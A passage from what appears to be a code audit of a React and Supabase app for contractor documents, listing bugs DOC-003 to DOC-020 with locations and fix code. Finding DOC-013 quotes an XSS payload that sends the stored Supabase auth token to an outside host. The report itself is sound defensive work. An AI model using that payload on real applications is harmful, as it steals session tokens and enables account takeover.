- **Fix:** Save first, then deduct atomically and only once.

  ```ts
  // App.tsx: handleSaveForm
  import { toNum } from './utils/documentTotals.ts';

  const isMatLog = view.formType === FormType.MaterialLog;
  const shouldDeduct = isMatLog && formData.deductInventory && !formData.inventoryDeductedAt;
  const perItem = new Map<string, number>();
  if (shouldDeduct) {
    for (const it of (formData as MaterialLogData).items) {
      if (it.inventoryItemId) perItem.set(it.inventoryItemId, (perItem.get(it.inventoryItemId) || 0) + toNum(it.quantity));
    }
    for (const [id, qty] of perItem) {
      const inv = inventory.find(i => i.id === id);
      if (!inv || inv.quantity < qty) { alert(`Not enough stock for ${inv?.name ?? 'an item'}.`); return; }
    }
  }
  const dataToSave = {
    ...formData,
    ...(isMatLog ? { deductInventory: false, inventoryDeductedAt: shouldDeduct ? new Date().toISOString() : formData.inventoryDeductedAt } : {}),
    ...(/* AI flag logic unchanged */ {}),
  };
  // ... upsert(formRecord with data: dataToSave) ... if (saveError) return;
  if (shouldDeduct) {
    for (const [id, qty] of perItem) {
      const { error } = await supabase.rpc('decrement_inventory', { p_item_id: id, p_qty: qty, p_job_id: view.jobId });
      if (error) alert(`Inventory not updated: ${error.message}`);
    }
    fetchInventoryOnly(); // refresh inventory, NOT fetchData() (see DOC-008)
  }
  ```

  ```sql
  -- run once in Supabase
  alter table public.inventory alter column quantity type numeric using quantity::numeric;
  alter table public.inventory_history alter column quantity_change type numeric using quantity_change::numeric;
  create or replace function public.decrement_inventory(p_item_id uuid, p_qty numeric, p_job_id uuid)
  returns void language plpgsql security invoker as $$
  begin
    update public.inventory set quantity = quantity - p_qty
     where id = p_item_id and user_id = auth.uid() and quantity >= p_qty;
    if not found then raise exception 'Insufficient stock'; end if;
    insert into public.inventory_history(item_id, user_id, action, quantity_change, job_id, notes)
    values (p_item_id, auth.uid(), 'job_allocation', -p_qty, p_job_id, 'Material log');
  end $$;
  ```

  In `MaterialLogForm.tsx`, add `inventoryDeductedAt?: string` to `MaterialLogData`. Disable the checkbox and show "Deducted on {date}" when it is set. Remove `deductInventory` from the prefill mapping at line 88; it must be a user action.

### DOC-003: The in-form "AI" button always fails (Invoice, Estimate, Work Order, Daily Report, Change Order)
- **Severity:** High
- **Status:** CONFIRMED
- **Location:** `src/hooks/useContractorAI.ts:25, 51`; `App.tsx:72`; `index.html:17`
- **What's wrong:** The hook relies on `declare const supabase: any;` and calls `supabase.functions.invoke(...)`. The only global `supabase` is the UMD **library namespace** from the CDN script. `App.tsx:72` proves this by calling `window.supabase.createClient(...)`. The namespace has no `.functions`, so the call throws `TypeError: Cannot read properties of undefined (reading 'invoke')`. `AIDocumentModal` then shows that error. It also never sends the user's auth token.
- **Repro:** Open any of the five forms, click AI, type a prompt, submit: an error appears and no fields change.
- **Fix:** Export one client and import it everywhere.

  ```ts
  // services/supabaseClient.ts (new)
  import type { SupabaseClient } from '@supabase/supabase-js';
  const url = 'https://iauteblvljppwzsxloyd.supabase.co';
  const anon = '<anon key>';
  export const supabase: SupabaseClient = (window as any).supabase.createClient(url, anon);
  ```
  ```diff
  // App.tsx:72
  - const supabase: SupabaseClient = (window as any).supabase ? (window as any).supabase.createClient(supabaseUrl, supabaseAnonKey) : null;
  + import { supabase } from './services/supabaseClient.ts';
  // src/hooks/useContractorAI.ts
  - declare const supabase: any;
  + import { supabase } from '../../services/supabaseClient.ts';
  ```

  Also make the restriction strings match `FormType` (`"WorkOrder"` → `FormType.WorkOrder`, `"ChangeOrder"` → `FormType.ChangeOrder` in `WorkOrderForm.tsx:370` and `ChangeOrderForm.tsx:580`), and build `onSuccess` handlers from `doc.form_payload ?? doc.data ?? {}`. Today `InvoiceForm.tsx:227-232` and `EstimateForm.tsx:316-321` dereference `docs[0].data.ai_visual_data` without a null check.

### DOC-004: The prefill effect re-runs on every App re-render (9 forms): edits are overwritten and auto-save can duplicate
- **Severity:** High
- **Status:** CONFIRMED (code); trigger frequency LIKELY
- **Location:**
  - `EstimateForm.tsx:107-149`, `WorkOrderForm.tsx:75-101`, `TimeSheetForm.tsx:71-94`, `MaterialLogForm.tsx:66-96`
  - `ExpenseLogForm.tsx:74-105`, `WarrantyForm.tsx:47-70`, `ReceiptForm.tsx:66-88`
  - `ChangeOrderForm.tsx:73-111`, `PurchaseOrderForm.tsx:75-114`
  - `App.tsx:2089` (`handleSaveForm` is a new function on every render)
- **What's wrong:** These effects depend on `[prefillData, onSave]`. `onSave` is `handleSaveForm`, which is recreated on every App render, so the effect re-runs every time App re-renders. Each run does `setFormData({...currentState, ...prefillData, lineItems: freshly-mapped-with-new-UUIDs})`. That:
  - overwrites any field the user edited that also exists in `prefillData`;
  - replaces all line items (user rows are lost);
  - with `auto_submit`, starts a new 1-second save timer.

  `handleSaveForm` itself calls `setForms(...)` before `await loadDocumentsForJob(...)`, which re-renders App. If the reload plus navigation takes more than 1 s (slow mobile network), the re-armed timer fires a **second save with a new UUID**, creating a duplicate document.
- **Fix (two parts, both shared):**
  1. In `App.tsx`, pass a stable callback (this fixes all 9 forms at once):
     ```ts
     const saveFormRef = useRef(handleSaveForm);
     saveFormRef.current = handleSaveForm;
     const stableSaveForm = useCallback((d: any, opts?: any) => saveFormRef.current(d, opts), []);
     // renderForm: onSave={stableSaveForm} for every form
     ```
  2. Make prefill apply once. Use the existing, unused `hooks/useDocumentDraftPrefill.ts` with a ref-based key on the draft id (see DOC-006):
     ```ts
     // hooks/useDocumentDraftPrefill.ts (replace body)
     export function useApplyPrefillOnce(prefill: any, apply: (p: any) => void | (() => void)) {
       const applied = useRef<string | null>(null);
       const applyRef = useRef(apply); applyRef.current = apply;
       useEffect(() => {
         if (!prefill) return;
         const key = String(prefill.__draftId ?? JSON.stringify(prefill).length);
         if (applied.current === key) return;
         applied.current = key;
         return applyRef.current(prefill) || undefined;
       }, [prefill]);
     }
     // in each form, replace the useEffect(..., [prefillData, onSave]) with:
     useApplyPrefillOnce(prefillData, (pf) => {
       setFormData(prev => buildPrefilled(prev, pf));   // use prev, not the closed-over state
       if (pf.auto_submit) { const t = setTimeout(() => onSave(buildPrefilled(formDataRef.current, pf)), 1000); return () => clearTimeout(t); }
     });
     ```
- **Affected files:** the 9 forms above (Invoice, DailyReport and Note already depend only on `[prefillData]`, but should also adopt the hook so they behave the same).

### DOC-005: AI prefill lives in `history.state`, so Back or Refresh re-runs the auto-save and creates duplicate documents
- **Severity:** High
- **Status:** CONFIRMED
- **Location:** `App.tsx:923-927` (`navigate(path, { state: { prefillData } })`), `App.tsx:889`, `App.tsx:1088-1093` (`auto_submit: mode==='auto_save'`), `App.tsx:2146`
- **What's wrong:** After an auto-saved AI draft, `handleSaveForm` **pushes** `/jobs/:id`. The previous history entry still holds `{prefillData: {..., auto_submit: true}}`. Pressing Back (or reloading during the one-second window) remounts the form with the same prefill, and it auto-saves another copy. In review mode, Back shows a "new" form pre-filled with an already-saved draft.
- **Fix:** Replace the form entry instead of pushing, and mark drafts with an id.

  ```ts
  // App.tsx: setView gains an options arg
  const setView = (newView: AppView, opts: { replace?: boolean } = {}) => {
    switch (newView.screen) {
      // ...
      case 'jobDetails': navigate(`/jobs/${newView.jobId}`, { replace: !!opts.replace }); break;
      case 'form': { /* ... */ navigate(path, { state: { prefillData: newView.prefillData }, replace: !!opts.replace }); break; }
    }
  };
  // openAIDraft: add a unique id
  prefillData: { ...draft, __draftId: crypto.randomUUID(), ai_open_mode: mode, auto_submit: mode === 'auto_save', start_page: 1 },
  // handleSaveForm end:
  const cameFromDraft = !!view.prefillData;
  setView({ screen: 'jobDetails', jobId: view.jobId }, { replace: cameFromDraft });
  ```

  As a backstop, keep a `sessionStorage` set of consumed `__draftId`s and skip `auto_submit` if the id is already in it.

### DOC-006: The AI draft queue reuses the same component key, so data from one draft leaks into the next
- **Severity:** High
- **Status:** CONFIRMED
- **Location:** `App.tsx:3000`, `App.tsx:2139-2142`
- **What's wrong:** The key is `formId || new-${formType}-ai`. When several drafts of the same type are queued (for example two invoices), the second draft renders with the **same key**, so React keeps the component and its state. The prefill effect then does `{...previousDraftState, ...nextPrefill}`. Every field the second draft does not provide is inherited from the first: `ai_visual_data`, `paypalLink`, line items when the second has none, signature, `recurrence`, and so on.
- **Fix:**
  ```diff
  - const componentKey = formId || `new-${formType}-${prefillData ? 'ai' : 'blank'}`;
  + const componentKey = formId || `new-${formType}-${(prefillData as any)?.__draftId ?? location.key}`;
  ```
  (`location` is already available in App. `__draftId` comes from DOC-005.)

### DOC-007: New documents have no idempotency or double-submit guard; Save & Download races the navigation
- **Severity:** High
- **Status:** CONFIRMED
- **Location:** `App.tsx:2101`; every form's Save / Save & Download buttons:
  - `InvoiceForm.tsx:896-906`, `EstimateForm.tsx:632-647`, `WorkOrderForm.tsx:337-343`, `DailyJobReportForm.tsx:1056-1062`
  - `TimeSheetForm.tsx:276-282`, `MaterialLogForm.tsx:279-281`, `ExpenseLogForm.tsx:429-431`, `WarrantyForm.tsx:264-271`
  - `NoteForm.tsx:758-765`, `ReceiptForm.tsx:195-197`, `ChangeOrderForm.tsx:493-495`, `PurchaseOrderForm.tsx:305-307`
- **What's wrong:**
  - `id: view.formId || crypto.randomUUID()`: each click on Save for a new document inserts a **new row**. A double-click, or Save followed by Save & Download before the navigation completes, creates duplicates.
  - `onSave` is typed `void` and never awaited, and no button is disabled during the save.
  - "Save & Download" fires `onSave` (which navigates away and unmounts the form) and then `await handleDownload()`. The PDF is still produced from captured data, but `setIsDownloading` runs on an unmounted component, and with DOC-004 the auto-save can fire twice.
- **Fix (shared):**
  ```ts
  // App.tsx
  const newDocIdRef = useRef<{ key: string; id: string } | null>(null);
  const savingRef = useRef(false);
  const handleSaveForm = async (formData: any, opts: { stay?: boolean } = {}) => {
    if (!session || view.screen !== 'form' || savingRef.current) return;
    savingRef.current = true;
    try {
      if (!view.formId && newDocIdRef.current?.key !== location.key) newDocIdRef.current = { key: location.key, id: crypto.randomUUID() };
      const id = view.formId || newDocIdRef.current!.id;   // same id on retries → upsert, not a second insert
      // ... existing body using `id` ...
    } finally { savingRef.current = false; }
  };
  ```
  ```tsx
  // each form
  const [save, saving] = useAsyncAction(() => onSave(formData));
  const [download, downloading] = useAsyncAction(handleDownload);
  <Button onClick={save} disabled={saving || downloading}>Save</Button>
  <Button onClick={async () => { await download(); await save(); }} disabled={saving || downloading}>Save & Download</Button>
  ```
  Download first, then save, because the save navigates away. Change every `onSave` prop type to `(d: X) => Promise<void>`.

### DOC-008: An open existing document is replaced by a permanent "Loading document…" when `fetchData` runs (for example when the connection comes back); unsaved edits are lost
- **Severity:** High
- **Status:** CONFIRMED (code path)
- **Location:** `App.tsx:1614-1627` (`setForms(mappedForms)`, metadata only), `App.tsx:1338-1355` (`online` → `syncOfflineData` → `fetchData`), `App.tsx:2986-2997`, `App.tsx:1879-1883`
- **What's wrong:** `fetchData` replaces `forms` with lightweight metadata for the latest 50 documents, which drops the full JSON of the document being edited. `renderForm` then sees a lightweight (or missing) doc and swaps the form for "Loading document…". The loader effect depends only on `formId`, which did not change, so it never reloads. The form stays unmounted; all unsaved edits are gone, and the spinner never ends.
  - Triggers: a phone regaining signal (the `online` event, common on job sites), `handleAllocateInventory`, `handleAddClient`, `handleUpdateClient`, and the other `fetchData()` callers in the 2150-2499 range.
- **Fix:**
  ```ts
  // App.tsx fetchData: keep already-loaded full documents
  setForms(prev => {
    const full = new Map(prev.filter(f => !isLightweightDocument(f)).map(f => [f.id, f]));
    const merged = mappedForms.map(f => full.get(f.id) ?? f);
    const extra = [...full.values()].filter(f => !merged.some(m => m.id === f.id));
    return [...merged, ...extra];
  });
  // renderForm: self-heal if the doc vanished
  useEffect(() => {
    if (view.screen === 'form' && view.formId && !loadingDocumentId) {
      const f = forms.find(x => x.id === view.formId);
      if (!f || isLightweightDocument(f)) loadDocumentData(view.formId);
    }
  }, [view, forms, loadingDocumentId]);
  ```

  Also stop calling `fetchData()` from per-entity handlers; refresh only the table that changed.

### DOC-009: Signatures never appear in any premium template; PayPal link, terms and client approval are also missing
- **Severity:** High
- **Status:** CONFIRMED (grep plus harness)
- **Location:** `data.signature` in:
  - `documentHtmlTemplates.ts:183, 350, 496, 639, 804`
  - `newHtmlTemplates.ts:139, 295`
  - `allNewTemplates.ts:106, 254, 369`
  - `secondSetTemplates.ts:87, 190, 277, 370, 456`
  - `thirdSetTemplates.ts:165, 260, 340, 418, 427`
- **What's wrong:**
  - All 20 templates render `data.signature`, but every form stores `signatureUrl`. In the harness, no template rendered the signature for an invoice, and 4 of 20 dropped it for a daily report (the other matches were color codes).
  - No template renders `paypalLink`; the "Pay Now" button exists only in the jsPDF path (`pdfGenerator.ts:649-657`).
  - `terms` appear only in Glassmorphism, so estimates lose their T&Cs in 19 of 20 templates.
  - `clientSignatureUrl` (the digital approval) is never rendered.
- **Fix:** The `prepareTemplateData` from DOC-001 maps `signature: raw.signatureUrl`. Also add a shared footer block, appended by `pdfGenerator` after `templateFn` returns, so the templates do not need 20 edits:
  ```ts
  const extrasHtml = (d: any, color: string) => `
    ${d.paypalLink ? `<div style="margin:24px 40px"><a href="${safeUrl(d.paypalLink)}" style="background:${safeColor(color)};color:#fff;padding:10px 18px;border-radius:6px;text-decoration:none;font-weight:700">PAY NOW</a></div>` : ''}
    ${d.terms ? `<div style="margin:16px 40px;font-size:11px;color:#444"><b>Terms &amp; Conditions</b><br/>${textToHtml(d.terms)}</div>` : ''}
    ${d.clientSignatureUrl ? `<div style="margin:16px 40px"><img src="${safeUrl(d.clientSignatureUrl)}" style="max-height:60px"/><div style="font-size:10px">Accepted by ${esc(d.clientSignedBy || d.clientName)} ${d.clientSignedAt ? esc(new Date(d.clientSignedAt).toLocaleDateString()) : ''}</div></div>` : ''}`;
  const html = templateFn(td, profile, title, labels) + extrasHtml(td, td.themeColors?.primary);
  ```
  `renderHtmlToPdf` already converts `<a href>` into clickable PDF links (lines 250-375), so the Pay Now link will work.

### DOC-010: Daily Report and Note content is dropped by 4 templates, AI visuals are duplicated in 4 others, and the adapter strips progress bars
- **Severity:** High
- **Status:** CONFIRMED (harness)
- **Location:** `utils/templates/templateAdapters.ts:29-41, 50-53, 61-70, 75-112`
- **What's wrong (harness results):**
  - `template_memphis`, `template_watercolor`, `template_retro`, `template_serif` → **REPORT_CONTENT_DROPPED** (and the signature dropped). `adjustContentLayout` tries three regexes and a footer regex; when none match, it returns the HTML **without the content** (line 111). A daily report with one of these templates produces a PDF with a header and nothing else.
  - `template_html`, `template_html_2`, `template_html_2_new`, `template_html_4` → **AI_visuals_x2**. The adapter spreads `...data` (including `ai_visual_data`) into the template, which renders the visuals itself (added in the recent diff), and then the adapter appends them again.
  - `removeEmptyTables` deletes every `<div …></div>` (line 67). That removes the progress-bar fill and chart bars that `getAIVisualHtml` draws with empty divs, plus decorative accent bars and signature lines.
- **Fix:**
  ```ts
  export const adaptTemplateForContentDocument = (templateFn, data, profile, title, labels) => {
    const MARK = '<!--__CONTENT_SLOT__-->';
    const adaptedData = { ...data, lineItems: [], items: [], notes: MARK, terms: undefined,
      taxRate: 0, tax: 0, discount: 0, shipping: 0, ai_visual_data: undefined /* rendered once below */ };
    let html = templateFn(adaptedData, profile, title, labels);
    // drop only <table>s that have an empty <tbody>; never strip arbitrary empty <div>s
    html = html.replace(/<table[^>]*>\s*(<thead>[\s\S]*?<\/thead>)?\s*<tbody>\s*<\/tbody>\s*<\/table>/gi, '');
    const ai = data.ai_visual_data ? getAIVisualHtml(data.ai_visual_data, data.themeColors?.primary || '#000') : '';
    const section = `<div style="padding:20px 30px">${data.content || ''}${ai}</div>`;
    if (html.includes(MARK)) return html.replace(MARK, section);
    // guaranteed fallback: insert before the last closing tag
    const i = html.lastIndexOf('</div>');
    return i > -1 ? html.slice(0, i) + section + html.slice(i) : html + section;
  };
  ```
  The templates already render `data.notes` inside a "Notes" box, so this uses that box as a deterministic slot. Rename the box label for content documents if needed, or add a `${data.__contentSlot ?? ''}` placeholder to each template.

### DOC-011: All 20 premium templates are offered for every document type, but most generators silently fall back to "standard"
- **Severity:** High
- **Status:** CONFIRMED
- **Location:** `TemplateSelector.tsx:52-73`; `pdfGenerator.ts:535` (Invoice: 20), `698` (Estimate: **15**, missing swiss/space/retro/pop/serif), `1002` (Daily: 20), `1315` (Note: 20). WorkOrder (923), PO (821), TimeSheet (1105), MaterialLog (1155), ExpenseLog (1192), Warranty (1246), Receipt (1376) and ChangeOrder (1419) have **no HTML branch**: `templates[templateId] || templates.standard` returns standard.
- **Repro:** Estimate with "Space Odyssey", or any Work Order, Change Order or PO with any Premium template: the PDF is the plain standard layout. The AI also picks premium styles (`resolveTemplateId`), so AI-drafted change orders and POs look nothing like the preview.
- **Fix (shared):** One template registry and one generic HTML path.
  ```ts
  // utils/templates/registry.ts
  export const HTML_TEMPLATES: Record<string, TemplateFn> = {
    template_html: getAdvancedHtmlTemplate, template_html_2: getHighEndHtmlTemplate, /* ...all 20... */ };
  export const isHtmlTemplate = (id?: string) => !!id && id in HTML_TEMPLATES;
  ```
  ```ts
  // pdfGenerator.ts
  const renderHtmlDocument = async (doc: any, kind: 'lines' | 'content', data: any, profile: UserProfile, title: string, labels: Labels) => {
    const fn = HTML_TEMPLATES[data.templateId];
    const td = prepareTemplateData(escapeTemplateData(data));          // DOC-001, DOC-013
    const html = kind === 'lines' ? fn(td, profile, title, labels) : adaptTemplateForContentDocument(fn, td, profile, title, labels);
    await renderHtmlToPdf(doc, html, 0, 0, 210);
  };
  // map non-line documents to content HTML, for example:
  const toContent: Record<string, (d: any) => string> = {
    'Work Order': d => `<h3>Description of Work</h3>${textToHtml(d.description)}<h3>Materials</h3>${textToHtml(d.materialsUsed)}<p><b>Status:</b> ${esc(d.status)} · <b>Hours:</b> ${toNum(d.hours)} · <b>Cost:</b> ${money(d.cost)}</p>`,
    'Warranty': d => `<p>Presented to <b>${esc(d.clientName)}</b> for ${esc(d.projectAddress)}</p><p><b>Duration:</b> ${esc(d.duration)}</p><h3>Coverage</h3>${textToHtml(d.coverage)}<h3>Conditions</h3>${textToHtml(d.conditions)}`,
    // Time Sheet, Receipt, Expense Log (table), Material Log (table) ...
  };
  ```
  Use the `lines` mode for Change Order and Purchase Order (both have `lineItems`). Until every type is supported, have `TemplateSelector` take a `supportsPremium` prop and hide the Premium tab for unsupported types.

### DOC-012: The Expense Log PDF item table is always empty
- **Severity:** High
- **Status:** CONFIRMED
- **Location:** `pdfGenerator.ts:1208-1216` reads `data.items`; `ExpenseLogForm.tsx:34, 107-137` writes `lineItems`.
- **Fix:**
  ```diff
  - const items = data.items || [];
  - const tableRows = items.map(item => [item.description, `$${(item.amount || 0).toFixed(2)}`]);
  + const rows = (data.lineItems?.length ? data.lineItems.map(li => ({ description: li.description, amount: toNum(li.rate) * toNum(li.quantity, 1) }))
  +            : (data.items || []).map(i => ({ description: i.description, amount: toNum(i.amount) })));
  + const tableRows = rows.map(r => [r.description, money(r.amount)]);
  + if (toNum(data.tax)) tableRows.push(['Tax', money(data.tax)]);
  ```
  Also print `Vendor`, `Category` and the signature, which the form captures (`ExpenseLogForm.tsx:408`) but the PDF never draws.

### DOC-013: XSS: unescaped user and AI data is injected into HTML that runs on the app origin (and in the client portal)
- **Severity:** High
- **Status:** CONFIRMED (the harness shows `<img src=x onerror=…>` passes through unescaped)
- **Location:**
  - every `${…}` in the 20 templates; `getAIVisualHtml` (`documentHtmlTemplates.ts:10-41`)
  - `pdfGenerator.ts:94` (`wrapper.innerHTML = html` on a **detached element of the main document**, so `<img onerror>` fires)
  - `DailyJobReportForm.tsx:956-959` (`dangerouslySetInnerHTML` of **raw** `prefillData.content || description_html`; the sanitized copy goes into state, the raw one is rendered)
  - `DailyJobReportForm.tsx:1007-1011` (iframe `srcDoc` with no `sandbox`, so the iframe inherits the app origin and can read `parent.localStorage`, where the Supabase session lives)
  - `TemplateSelector.tsx:260-265` (same, dummy data only)
  - `PortalView.tsx:106-112` (client portal renders contractor documents through the same templates)
- **What's wrong:** Client names, line descriptions, notes, `themeColors` (interpolated into CSS) and AI output (which can come from Gmail-ingested emails through the master AI router) are concatenated into HTML without escaping and parsed with `innerHTML`. A payload such as `<img src=x onerror=fetch('//x?'+localStorage['sb-…-auth-token'])>` in any text field runs when the contractor downloads the PDF, and when the client downloads it from the portal.
- **Fix:**
  1. Escape all data before it reaches a template. One function, called in `renderHtmlDocument` (DOC-011):
     ```ts
     import { esc, safeUrl, safeColor } from '../utils/html.ts';
     const RICH = new Set(['content']);          // editor HTML: sanitize, don't escape
     export const escapeTemplateData = (v: any, key = ''): any => {
       if (typeof v === 'string') {
         if (RICH.has(key)) return sanitizeRich(v);
         if (/(Url|^signature)$/i.test(key)) return safeUrl(v);
         if (key === 'primary' || key === 'secondary') return safeColor(v);
         return esc(v);
       }
       if (Array.isArray(v)) return v.map(x => escapeTemplateData(x));
       if (v && typeof v === 'object') return Object.fromEntries(Object.entries(v).map(([k, x]) => [k, escapeTemplateData(x, k)]));
       return v;
     };
     // and escape the profile the same way before passing it to templates
     ```
     For the editor HTML (`content`), add `dompurify` (`npm i dompurify`) and use `DOMPurify.sanitize(html, { FORBID_TAGS: ['style','script','iframe','form','object','embed'], FORBID_ATTR: ['srcset'], ALLOW_DATA_ATTR: false })`. That keeps inline styles (table borders, highlights, image sizes), which `sanitizeAiHtml` would strip.
  2. Render inside a script-less sandbox so a missed field cannot execute:
     ```ts
     const frame = document.createElement('iframe');
     frame.setAttribute('sandbox', 'allow-same-origin');   // no allow-scripts: handlers never run
     frame.style.cssText = 'position:absolute;left:-10000px;top:0;width:' + renderWidth + 'px;height:10px;border:0';
     document.body.appendChild(frame);
     frame.contentDocument!.open(); frame.contentDocument!.write(`<!doctype html><html><head><style>${css}</style></head><body>${html}</body></html>`); frame.contentDocument!.close();
     const canvas = await html2canvas(frame.contentDocument!.body, { scale: 2, useCORS: true, backgroundColor: '#fff' });
     frame.remove();
     ```
  3. `DailyJobReportForm.tsx:958`: render `data.content` (already sanitized) instead of `prefillData.content`. Add `sandbox=""` to the preview iframes in `DailyJobReportForm.tsx:1007` and `TemplateSelector.tsx:260`.

### DOC-014: jsPDF layouts have no page-break handling; Invoice notes overlap; totals and signatures can fall off the page
- **Severity:** High
- **Status:** CONFIRMED
- **Location:**
  - `pdfGenerator.ts:617-686` (Invoice: totals at `finalY+25`, notes `currentY += 20` regardless of line count, signature), `748-767` (Estimate terms), `902-917` (PO), `933-991` (WO), `1130-1149` (TimeSheet), `1182-1186` (MaterialLog), `1228-1240` (Expense), `1266-1304` (Warranty: fixed Y positions; long coverage runs into the bottom color bar), `1388-1413` (Receipt: unwrapped description)
  - `drawTemplateBackground` is not called on autoTable's continuation pages.
- **What's wrong:** When the item table ends near the bottom of a page, "Total" is drawn at y > 297 mm and is simply not visible. Multi-line invoice notes are drawn with `maxWidth` but the cursor advances only 20 mm, so they overprint the signature. A long receipt description runs off the right edge.
- **Fix (shared helper):**
  ```ts
  const PAGE_H = 297, BOTTOM = 20, TOP = 20;
  const ensureSpace = (doc: any, y: number, needed: number, onNewPage?: () => void) => {
    if (y + needed <= PAGE_H - BOTTOM) return y;
    doc.addPage(); onNewPage?.(); return TOP;
  };
  const writeWrapped = (doc: any, text: unknown, x: number, y: number, width: number, lineH = 5, onNewPage?: () => void) => {
    const lines: string[] = doc.splitTextToSize(String(text ?? ''), width);
    for (const line of lines) { y = ensureSpace(doc, y, lineH, onNewPage); doc.text(line, x, y); y += lineH; }
    return y;
  };
  // Invoice totals
  let y = ensureSpace(doc, (doc as any).lastAutoTable.finalY + 10, 35, bg);
  // ... totals using y, y+5, ...
  y = writeWrapped(doc, invoice.notes, 20, y + 5, 170, 5, bg);
  y = ensureSpace(doc, y + 5, 30, bg); /* signature */
  // autoTable: redraw template background on each new page
  (doc as any).autoTable({ ..., didDrawPage: (d: any) => { if (d.pageNumber > 1) drawTemplateBackground(doc, template, primaryRgb); } });
  ```
  Apply `writeWrapped` to every free-text field in all 12 generators.

### DOC-015: PDF generators crash on null, NaN, string numbers and undefined text
- **Severity:** High
- **Status:** CONFIRMED (the NaN→null path) / LIKELY (AI strings)
- **Location:**
  - `pdfGenerator.ts:962-963` (`data.hours.toString()`, `data.cost.toFixed`), `944` (`splitTextToSize(data.description)`)
  - `1116-1118` (TimeSheet `toString`, and `hoursWorked + overtimeHours` concatenates strings)
  - `1169-1170` (`item.unitCost.toFixed`)
  - `1391` (`data.amount.toFixed`)
  - `838, 846, 875` (`doc.text(data.vendorName | shipToName | deliveryDate)`; jsPDF throws on `undefined`)
  - `1059` (`doc.text(data.projectName)`), `1284, 1292` (`splitTextToSize(undefined)`)
  - `ExpenseLogForm.tsx:395` (`formData.amount.toFixed`, the screen crashes too)
- **What's wrong:** A cleared numeric field stores `NaN`, which `JSON.stringify` saves as `null`. AI prefill may supply `"500"` (`WorkOrderForm.tsx:82-83`, `ReceiptForm.tsx:75`, `ExpenseLogForm.tsx:91-92`, `TimeSheetForm.tsx:79-80`). The next Download shows the generic "Error generating PDF" alert, and for Expense Log the form itself crashes to a white screen (there is no ErrorBoundary).
- **Fix:** Use `toNum`/`money` (shared helper) everywhere a number is formatted, and a safe text helper:
  ```ts
  const t = (v: unknown) => (v === null || v === undefined ? '' : String(v));
  // examples
  ['Labor Hours', String(toNum(data.hours))], ['Estimated Cost', money(data.cost)]
  ['Total Hours', String(round2(toNum(data.hoursWorked) + toNum(data.overtimeHours)))]
  doc.text(t(data.vendorName), 20, colY + 5);
  ```
  Also coerce numbers at the prefill boundary (in `buildPrefilled` from DOC-004): `hours: toNum(pf.hours, prev.hours)`.

### DOC-016: Email attachments are generated from lightweight metadata, producing broken or empty PDFs
- **Severity:** High
- **Status:** CONFIRMED (cross-area: CommunicationView calls the pipeline)
- **Location:** `CommunicationView.tsx:341-346` → `pdfGenerator.ts:1530-1547`; `App.tsx:90-107` (list rows contain only `title, status, clientName, …`)
- **What's wrong:** `forms` holds lightweight rows unless a document was opened. `generateDocumentBase64(doc.type, doc.data, …)` then receives data without `lineItems`, `content` or dates. Invoices throw at `invoice.lineItems.map`; HTML templates render an empty table; Notes render nothing.
- **Fix:** Load the full JSON before generating.
  ```ts
  // pdfGenerator.ts (or the caller)
  export const generateDocumentBase64 = async (type, data, profile, job, loadFull?: () => Promise<any>) => {
    if (data?.__lightweight) { data = await loadFull?.(); if (!data) throw new Error('Document data not loaded'); }
    ...
  };
  // CommunicationView: pass loadFull = () => supabase.from('documents').select('data').eq('id', docId).single().then(r => r.data?.data)
  ```

### DOC-017: Invoice "Share" does nothing visible; ShareModal shows the wrong total and promises an attachment it does not send
- **Severity:** High
- **Status:** CONFIRMED
- **Location:** `InvoiceForm.tsx:898-900`, `998-1004`; `ShareModal.tsx:29, 45, 68, 84-87`
- **What's wrong:**
  - Share calls `handleSave()` (which navigates to Job Details and unmounts the form) and then `setShowShareModal(true)`. The modal flashes, at best.
  - `[Total Amount]` = Σ qty×rate, ignoring tax, discount, shipping and progress billing.
  - The template says "Please find attached invoice…", but `mailto:` cannot attach a file and nothing is attached.
  - `.replace(' ', '_')` replaces only the first space, so "Work Order" and "Change Order" keys are wrong.
  - The recipient is not pre-filled from the client's email.
- **Fix:**
  ```tsx
  // InvoiceForm: share without leaving the page
  <Button onClick={() => setShowShareModal(true)}>Share</Button>
  // ShareModal
  import { computeDocumentTotals } from '../utils/documentTotals.ts';
  const templateKey = `${docType.toLowerCase().replace(/\s+/g, '_')}_default`;
  '[Total Amount]': data.lineItems ? `$${computeDocumentTotals(data).total.toFixed(2)}` : '',
  // add a "Download PDF" button inside the modal and change the default wording to
  // "I've attached invoice [Document Number]…" only when sent via Gmail; or route to CommunicationView with the doc preselected:
  onSendWithGmail={() => navigate('/communication', { state: { prefillData: { documentIds: [docId], to: clientEmail } } })}
  ```

### DOC-018: Numeric inputs produce `NaN` (Estimate, Material Log, Change Order, Purchase Order)
- **Severity:** Medium
- **Status:** CONFIRMED
- **Location:** `EstimateForm.tsx:509, 516, 523`; `MaterialLogForm.tsx:242-243`; `ChangeOrderForm.tsx:413-414`; `PurchaseOrderForm.tsx:276-277`
- **What's wrong:** `parseFloat(e.target.value)` without a fallback. Clearing a field (needed to type a new number on mobile) sets `NaN`. Totals show "$NaN", and the saved JSON has `null`, which later crashes the PDF (DOC-015).
- **Fix:** `onChange={e => updateItem(item.id, 'quantity', parseInputNumber(e.target.value))}`. For a better typing experience, keep the raw string in local state and parse on blur.

### DOC-019: Change Order and Purchase Order reset the form to the saved `data` whenever `profile` or `data` changes identity
- **Severity:** Medium
- **Status:** CONFIRMED (code) / LIKELY (trigger)
- **Location:** `ChangeOrderForm.tsx:58-71`; `PurchaseOrderForm.tsx:60-73` (`else { setFormData(data); }` with deps `[profile, data]`)
- **What's wrong:** Any profile refresh (settings save, logo change, subscription update) or any `setForms` that produces a new `data` object for this document discards everything typed since opening.
- **Fix:** Delete the `else` branch; `useState(data || …)` already initializes the state. If a profile backfill is wanted, copy the "fill only empty fields" pattern from `WorkOrderForm.tsx:64-71`.

### DOC-020: Expense Log OCR: scanned total is overwritten, vendor replaces your company, dates shift, string tax crashes
- **Severity:** Medium
- **Status:** CONFIRMED
- **Location:** `ExpenseLogForm.tsx:55-61, 171-240`; `utils/ocr.ts:21-45, 50-72`
- **What's wrong:**
  1. The auto-sum effect (55-61) recomputes `amount = Σ lineItems + tax` whenever `tax` or `lineItems` change. When OCR finds a total and a tax but no items, the default empty row (rate 0) makes `amount = tax`, so the scanned total is lost.
  2. OCR writes the **vendor** into `companyName`, `companyAddress` and `companyPhone` (198-206), which are *your* company fields.
